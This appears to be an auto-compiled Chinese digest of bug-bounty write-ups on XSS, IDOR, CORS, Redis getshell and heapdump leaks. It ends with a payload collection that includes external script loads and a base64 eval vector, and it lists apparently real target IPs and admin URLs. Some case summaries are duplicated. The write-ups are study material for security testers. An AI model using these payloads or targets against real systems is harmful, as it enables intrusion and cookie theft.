# SRC 实战报告提炼 — xss

> 来源：蚂蚁SRC榜一Clown的 114 份实战报告
> 提取时间：2026-09-14

## 典型案例摘要（20 份）

### 乌云越权总结

乌云越权总结 乌云知识库： http://www.anquan.us/static/drops/tips-727.html 我的越权之道--小川 越权可能存在的地方 增删改查 越权成因 程序员开发时未对权限进行判断而进行操作 个人成见 测试必须准备两个账号 目前测试越权的最好的方法是在burp的重放模块进行cookie替换，查看 两个账号是否会发送操作 增：一般比较少见，因为增基本会与用户进行绑定 删：比较多，删与改是最容易出现权限未绑定的地方 改：比较多，删与改是最容易出现权限未绑定的地方 查：一般比较少见，因为查基本会与用户进行绑定 乌云公开漏洞： （从后往前看，有意思即记录，有经验即总结

### 记录某实际系统的浅度测试（水文）

记录授权系统的测试 前言 此系统只是浅度测试，领导让我随便测测就行，各位大哥勿喷。目的主要还是用实际系统告诉还未工作的哥哥们，可能工作的系统有些比你挖的src叼，但肯定也有很low的，加油！ 正文部分 既然是授权了，一般情况下确定了这个ip，当时客户给我了一个前台810端口下的，IP访问，也不用想什么域名，测一下目录找找后台，或者nmap扫一下端口，看看后台是不是在其他端口就可以了，这里很简单，后台很好找，就在admin目录下，如下图 其他用于写报告的漏洞这里就不写了 先看以下前台 1、SQL注入漏洞 一般情况下还是想看看新闻详情页面，总觉得此页面会存在漏洞，但是很不友好，此页面测试了以下，过

### 对一次登陆系统的漏洞挖掘

基本情况 首先，该系统为一个登录系统，本人尝试了爆破，并没有发现弱口令的问题 然后就开始查看源代码，也就是通过源代码，从而拿下了系统权限 测试过程 首先，登录系统长这鸟样 指纹信息如下： 测试爆破无果，转而查看源代码，发现一处dom xss DOM XSS 看到一个upload的函数，然后是一个地址 我将这个地址打开后，界面如下 继续查看源代码 通过 Util.getWinParam().dialogArguments.flag 取得参数赋值给flag，然后调用一下试试 他把flag的值传给了flag2，然后漏洞就产生了 我们只要把参数值改为 a';alert(1)// 就能触发这个xss 截

### SRC挖掘经验-cors劫持账户

CORS 跨域资源共享，就是可以让不同网站和不同服务器直接通信。一篇CORS完整指南，总结的很详细，包括如何绕过等等 https://xz.aliyun.com/t/2745 某团的给的一个中危 挖洞过程无意中看到一个数据包，响应包中包含有Access-Control-Allow-Origin这个字段，然后就随手尝试看看有没有CORS漏洞！结果如图 再尝试 发现  如下图！ 发现后面再加上域名是可以跨域获取资源的 如何利用？ 利用方式就是泛解析，将http://m.****.com.rcoil.me解析到我们的IP上，由于比较穷买不起域名，就本地搭了个DNS设置了泛解析，如下图 只要是*.rc

### 未授权redis+getshell

记一次未授权访问redis+getshell 当我们日网站时候，常规漏洞如注入、xss等多尝试无果后，扫描端口也会发现意外收获。 本次扫到了6379也就是Redis，Redis在默认情况下，会绑定在0.0.0.0:6379，如果没有采用限制IP访问，就会将Redis服务暴露在公网上并且在没有设置密码认证的情况下，会导致任意用户未授权访问Redis以及读取Redis数据并写入公钥等远程连接。 当我们通过未授权访问或弱密码成功访问redis服务器，我们应该怎样进一步获取权限呢？ 连接redis：Redis-cli –h 被攻击ip 目前较主流的两个方法，第一种写入计划任务反弹shell set x

### edusrc挖掘技巧1

edusrc挖掘技巧 对于新人刚开设挖edusrc的时候需要花大量的时间来找系统和信息收集，当你遇见的系统又waf的时候可以适当的放弃别再这上面花时间了，列入sql注入，一个单引号尝试报错和闭合（最多就是把简单的绕过尝试一下）如果不行，那就果断放弃，xss的话在edu的模块是不需要花大量时间，但是为了后面的企业src可以更好的理解xss可以尝试挖掘一些（在控制台弹窗测试，因为未授权，出了问题别找我）这就是对于top10漏洞的技巧。 主要还是说一些系统的收集方法： 利用fofa 语句：“系统” && org=“China Education and Research Network Center

### xss基础与练习 (1)

XSS基础与练习 类型介绍: 反射型 反射型跨站脚本（Reflected Cross-Site Scripting）是最常见，也是使用最广的一种，可将恶意脚本附加到 URL 地址的参数中 反射型 XSS 的利用一般是攻击者通过特定手法（如电子邮件），诱使用户去访问一个包含恶意代码的 URL，当受害者点击这些专门设计的链接的时候，恶意代码会直接在受害者主机上的浏览器执行。此类 XSS 通常出现在网站的搜索栏、用户登录口等地方，常用来窃取客户端 Cookies 或进行钓鱼欺骗。 存储型 	持久型跨站脚本（Persistent Cross-Site Scripting）也等同于存储型跨站脚本（Sto

### xss报告1

两处存储xss 点击剧本平台 验证码登录，然后进去后想要填一些信息，填完就会出现 一个新增线上剧本功能点 按图所示 点击超链接 插入payload点击保存 然后鼠标放上面就会触发xss 会来到该界面 1. 角色信息的 角色剧本 直接插入payload 2.主持人处  3，提交审核打 审核账号cookie / 因为该处商家也是可以观看然后购买进店的同理可打商cookie

### 文件上传html嵌套xss语句

文件上传html嵌套xss语句 0x01漏洞描述 在我们文件上传的时候很有很可能会遇见无法上传马子的情况，我相信很多人在这个时候都会直接不管这一个上传点，然后在企业src里面这样的上传点可以试试上传一个html文件配合xss语句，导致一个挂黑页弹窗的危害，在众测里面达到了中危的标准 0x02.漏洞测试工具： Burp  html配合xss语句的文件 <!DOCTYPE html> <html> 	<head> 		<title></title> 		<meta charset="utf-8"> 		<script type="text/javascript"> 			alert("testxs

### 基础漏洞csrf挖掘 (1)

基础漏洞csrf挖掘 0x01:漏洞原理： 当我们可以使目标对象浏览器发送HTTP请求到别的Web 网站时,就会发生跨站请求伪造（CSRF)攻击。该Web网站会执行一些操作,使得请求看起来是有效的,并且发自目标对象。这种攻击一般依赖于目标对象之前已经通过了具有漏洞的网站的身份认证,并且攻击者向该网站发起的提交动作和网站的响应不被目标对象感知。当CSRF攻击成功时,我们就可以修改服务器端信息并很有可能完全接管用户的账号。 下面用一个列子来讲解： 李华登录他的网银并查看余额。 李华查看完余额后,登录不同域下的邮箱账号并查收邮件。 李华看到了一封具有连接到不熟悉网站的链接的邮件，并打开了这个链接以查

### 存储XSS

两处存储xss 点击剧本平台 验证码登录，然后进去后想要填一些信息，填完就会出现 一个新增线上剧本功能点 按图所示 点击超链接 插入payload点击保存 然后鼠标放上面就会触发xss 会来到该界面 1. 角色信息的 角色剧本 直接插入payload 2.主持人处  3，提交审核打 审核账号cookie / 因为该处商家也是可以观看然后购买进店的同理可打商cookie

### 不常规xss

不常规xss 当你在个人信息插入xss的时候，可能不会弹窗，但是你去访问别的页面进行网络加载的时候，说不定他就弹窗了！ 在用户名处进行xss插入，保存后并未弹窗。 当我们去访问别的页面，进行头像加载时，自动弹窗。

### xss-3

绕过思路就是 在action前面加一个/ action/=javascript: 就可以绕过 知道思路后，回到主题。 漏洞详细： 腾讯手游助手论坛存在xss漏洞 url: https://bbbb.xsxxx.com/ 登录之后我们点发帖 然后点击行内代码 综合我上面绕过的方法组合的poc bypassPoc: <iframe src/="data:text/html;base64, PHNjcmlwdD5hbGVydCgieHNzIik8L3NjcmlwdD4="></iframe> 为了不影响正常业务就保存到草稿箱了 草稿箱打开也正常弹出

### 越权漏洞(1) (1)

越权漏洞 越权，顾名思义，就是超出了权限或权力范围，越权漏洞是一种很常见的逻辑安全漏洞。 是由于服务器端对客户提出的数据操作请求过分信任，忽略了对该用户操作权限的判定，导致修改相关参数就可以拥有了其他账户的增、删、查、改功能，从而导致越权漏洞 隐藏的url实现权限管理    实现控制访问有些程序的管理员的管理页面只有管理员才显示，普通用户看不到，利用 URL 实现访问控制，但 URL 泄露或被恶意攻击者猜到后，这会导致越权攻击 引用对象直接查看 通过修改一下参数就可以产生水平越权，例如查看用户信息页面 URL 后加上自己的 id 便可查看，当修改为他人的 ID 号时会返回他人的信息，便产生了水

### edusrc挖掘技巧（全）

edusrc挖掘技巧总结 一： 对于新人刚开设挖edusrc的时候需要花大量的时间来找系统和信息收集，当你遇见的系统又waf的时候可以适当的放弃别再这上面花时间了，列入sql注入，一个单引号尝试报错和闭合（最多就是把简单的绕过尝试一下）如果不行，那就果断放弃，xss的话在edu的模块是不需要花大量时间，但是为了后面的企业src可以更好的理解xss可以尝试挖掘一些（在控制台弹窗测试，因为未授权，出了问题别找我）这就是对于top10漏洞的技巧。 主要还是说一些系统的收集方法： 利用fofa 语句：“系统” && org=“China Education and Research Network C

### 某鹅邮箱xss

某鹅邮箱附件上传html存储xss formaction事件是没有被过滤的 但直接插入不行 我们包裹img标签，直接插入也不行， 经过几天的挖掘发现，</:>会变成注释，在拼接在一起. </:> 会注释。那么本地构造个poc </:>变成注释就会执行后面，进行拼接 最终poc：<img src=http://www.baidu.com x=”⋌”  </:>1><</:>button formaction\=alert(1)<">M<<br>

### xss报告2

首先让你进行机构的基本信息填写，存在文件上传。 随便选择一个图片点击上传。抓包。发现文件名后缀为空，看返回包中显示的是上传的png格式，我们把 filename后面加上 html后缀，并且插入xss语句：<sCript>alert(1)</scriPt>;，放包。 成功造成储存xss.

### 1

短信轰炸(两处，注册、重置密码) ①漏洞url:http://www.example.com/FrontUser/UserRegister.aspx   注册账号处 输入手机号码，不断重放数据包，经测试无次数限制 ②漏洞url:http://www.example.com/FrontUser/UserReset.aspx   密码重置处 输入手机号码，然后进行抓包，然后进行重放数据包 输入手机号码，不断重放数据包，经测试无次数限制 任意用户注册 原因：因为验证码直接回显到数据包中 请求包： 响应包： 知道该值为验证码是因为用自己的手机号收取的验证码即为响应的value值,该账号为任意输入的账号

### 文件上传html嵌套xss语句

文件上传html嵌套xss语句 0x01漏洞描述 在我们文件上传的时候很有很可能会遇见无法上传马子的情况，我相信很多人在这个时候都会直接不管这一个上传点，然后在企业src里面这样的上传点可以试试上传一个html文件配合xss语句，导致一个挂黑页弹窗的危害，在众测里面达到了中危的标准 0x02.漏洞测试工具： Burp  html配合xss语句的文件 <!DOCTYPE html> <html> 	<head> 		<title></title> 		<meta charset="utf-8"> 		<script type="text/javascript"> 			alert("testxs

### 贵州电网heapdump泄露

heapdump泄露 资产关联性: 地址: http://119.23.19.84:9001//actuator/heapdump 将次文件下载，使用heapdump_tool.jar对其内容进行查找 找到redis数据库的连接密码和host信息 任意文件下载 漏洞地址： https://admin.charge.gapsd.com/api/account/shop/download/?Access-token=<REDACTED> 过程及证明截图: XSS跨站脚本攻击 ①xss 漏洞地址: https://admin.charge.gapsd.com/ap

## 实战 Payload 集（32 条去重）

### XSS

```
onclick="cors()">Exploit</button>
<script>alert(‘test1’)</script>
javascript:alert(
<script> document.forms[0].submit(); </script>
<sCript>alert(1)</scriPt>
<script>alert(/xss/)</script>
<script>alert('xss')</script>
<ScRipT sRc=http://xxxxx.cn/ExiptZI></SCriPt>
<ScRipT sRc=http://xxxxx.cn/Exi0TCW></SCriPt>
<svg/onload=alert(1)>
<svg/onload=alert(1)
var req = new XMLHttpRequest();
req.onload = reqListener;
req.open('get','http://www.target.local/login',true);
req.setRequestHeader('X-User', '<svg/onload=alert(1)>
<script>**CORS request here**</script>
onload="cors();">
<script>alert(’xss’)</script>
<img src=x onerror=eval(atob(’cz1jcmVXXXXXytNYXRoXXXXXXXXhbmRvbSgp’))>
```

### URL

```
https://github.com/Ridter/redis-rce.git
http://xx.xxx.xxx.xxx:8312/admin/login/index
http://119.23.19.84:9001//actuator/heapdump
http://xxx.com/Admin/Login.aspx]
https://feedback.mcd.com.cn/index.php/admin/login
http://121.37.96.101:8080/admin
http://0-sec.org/index.php/Admin/Wx/subscribereply/l/en/random
https://www.0-sec.org/admin/?a=html&art=<sCrIpT>alert(ian)<%2FsCrIpT>&m
http://www.0-sec.org/index.php?s=/admin/tagurl/addtagurl
```

### HTTP请求

```
POST /ueditor/php/controller.php?action=uploadfile HTTP/1.1
Host: cicm.pbcsf.tsinghua.edu.cn
Content-Length: 366
Cache-Control: max-age=0
Upgrade-Insecure-Requests: 1
Origin: http://guanli.sanyau.edu.cn
Content-Type: multipart/form-data; boundary=----WebKitFormBoundary7AxXraLSPRmXLA1m
User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.424
0.198 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/
GET /login HTTP/1.1
Host: www.target.local
Origin: https://attacker.domain/
X-User: <svg/onload=alert(1)>
```

### curl

```
curl = curl_init();
```

## 技术手法统计

- 提权: 17 次
- 漏洞利用: 17 次
- 参数篡改: 7 次
- WAF/过滤绕过: 3 次
- 枚举/爆破: 2 次
- 漏洞链: 1 次

